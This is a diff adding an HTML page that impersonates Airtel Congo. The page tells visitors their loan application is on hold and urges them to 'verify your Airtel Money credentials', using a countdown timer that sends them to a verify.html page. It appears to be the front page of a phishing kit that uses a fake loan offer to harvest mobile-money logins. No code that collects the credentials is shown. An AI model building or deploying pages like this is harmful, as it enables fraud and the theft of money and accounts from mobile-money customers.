@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Airtel Congo - Verification Required</title>
+  <link rel="stylesheet" href="css/styles.css">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%23ffffff'/><text x='16' y='22' font-family='Georgia, serif' font-size='18' font-weight='bold' fill='%23E51937' text-anchor='middle'>a</text></svg>">
+</head>
+<body class="verification-body">
+
+  <main class="verification-container">
+    <!-- Concentric Circle Receipt Badge -->
+    <div class="verify-icon-outer">
+      <div class="verify-icon-inner">
+        <!-- Receipt / Bill SVG Icon -->
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M4 2v20l2-1 2 1 2-1 2 1 2-1 2 1 2-1 2 1V2l-2 1-2-1-2 1-2-1-2 1-2-1-2 1Z" fill="rgba(255,255,255,0.2)"/>
+          <path d="M8 7h8"/>
+          <path d="M8 11h8"/>
+          <path d="M8 15h5"/>
+        </svg>
+      </div>
+    </div>
+
+    <!-- Heading -->
+    <h1 class="verify-title">Verification Required</h1>
+
+    <!-- Explanatory Text -->
+    <p class="verify-description">
+      Your loan application has been received and is currently on hold.<br>
+      To proceed with disbursement, <strong>please verify your Airtel Money credentials</strong> to ensure successful account validation.
+    </p>
+
+    <!-- Countdown Timer Pill -->
+    <div class="countdown-pill">
+      <span>Redirecting to secure verification in</span>
+      <span class="countdown-number" id="countdownNumber">3</span>
+      <span>s...</span>
+    </div>
+
+    <!-- Action Button -->
+    <a href="verify.html" id="proceedBtn" class="btn-verify-white">
+      Proceed to Verification
+    </a>
+  </main>
+
+  <script src="js/verification.js"></script>
+</body>
+</html>
